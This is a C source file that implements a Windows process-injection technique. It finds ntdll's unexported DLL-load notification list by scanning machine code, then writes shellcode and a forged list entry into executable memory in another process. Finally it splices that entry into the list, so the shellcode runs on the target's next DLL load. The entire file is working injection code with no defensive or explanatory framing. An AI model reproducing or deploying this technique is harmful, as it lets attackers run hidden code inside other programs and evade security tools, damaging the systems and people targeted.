#include <windows.h>
#include <winternl.h>
#include <stdio.h>

// Undocumented structure for the notification entry
typedef struct _LDR_DLL_NOTIFICATION_ENTRY {
    LIST_ENTRY List;
    PVOID NotificationRoutine;
    PVOID Context;
} LDR_DLL_NOTIFICATION_ENTRY, *PLDR_DLL_NOTIFICATION_ENTRY;

// Fox's signature scanner to find the unexported list head
// We scan LdrRegisterDllNotification for the LEA instruction pointing to the list
PVOID FindLdrpDllNotificationListHead() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PBYTE pLdrRegister = (PBYTE)GetProcAddress(hNtdll, "LdrRegisterDllNotification");
    
    // Quick AOB scan for: 48 8D 0D ?? ?? ?? ?? (lea rcx, [LdrpDllNotificationList])
    for (int i = 0; i < 0x100; i++) {
        if (pLdrRegister[i] == 0x48 && pLdrRegister[i+1] == 0x8D && pLdrRegister[i+2] == 0x0D) {
            LONG offset = *(PLONG)(&pLdrRegister[i+3]);
            return (PVOID)(&pLdrRegister[i+7] + offset);
        }
    }
    return NULL;
}

void InjectViaLdrNotification(HANDLE hProcess, PVOID shellcode, SIZE_t shellcodeSize) {
    // 1. Get the list head address (same in our process and target)
    PLIST_ENTRY pListHead = (PLIST_ENTRY)FindLdrpDllNotificationListHead();
    
    // 2. Allocate memory in target for shellcode + our fake entry
    SIZE_t totalSize = shellcodeSize + sizeof(LDR_DLL_NOTIFICATION_ENTRY);
    PBYTE pTargetMem = (PBYTE)VirtualAllocEx(hProcess, NULL, totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    PVOID pTargetShellcode = pTargetMem;
    PLDR_DLL_NOTIFICATION_ENTRY pTargetEntry = (PLDR_DLL_NOTIFICATION_ENTRY)(pTargetMem + shellcodeSize);
    
    // 3. Read the current Flink/Blink from the target process
    LIST_ENTRY targetListHead;
    ReadProcessMemory(hProcess, pListHead, &targetListHead, sizeof(LIST_ENTRY), NULL);
    
    // 4. Prepare our fake entry locally
    LDR_DLL_NOTIFICATION_ENTRY fakeEntry = {0};
    fakeEntry.NotificationRoutine = pTargetShellcode;
    fakeEntry.Context = NULL;
    
    // Splice logic: insert at the end of the list (Blink)
    fakeEntry.List.Flink = pListHead; // Point forward to head
    fakeEntry.List.Blink = targetListHead.Blink; // Point back to old last entry
    
    // 5. Write the shellcode and fake entry to the target
    WriteProcessMemory(hProcess, pTargetShellcode, shellcode, shellcodeSize, NULL);
    WriteProcessMemory(hProcess, pTargetEntry, &fakeEntry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), NULL);
    
    // 6. Fix the pointers in the target's existing list to include our entry
    // Update old last entry's Flink to point to us
    PVOID pOldLastFlink = (PBYTE)targetListHead.Blink + offsetof(LIST_ENTRY, Flink);
    WriteProcessMemory(hProcess, pOldLastFlink, &pTargetEntry, sizeof(PVOID), NULL);
    
    // Update list head's Blink to point to us
    PVOID pHeadBlink = (PBYTE)pListHead + offsetof(LIST_ENTRY, Blink);
    WriteProcessMemory(hProcess, pHeadBlink, &pTargetEntry, sizeof(PVOID), NULL);
    
    printf("[+] Spliced LdrpDllNotificationList. Payload executes on next DLL load.\n");
}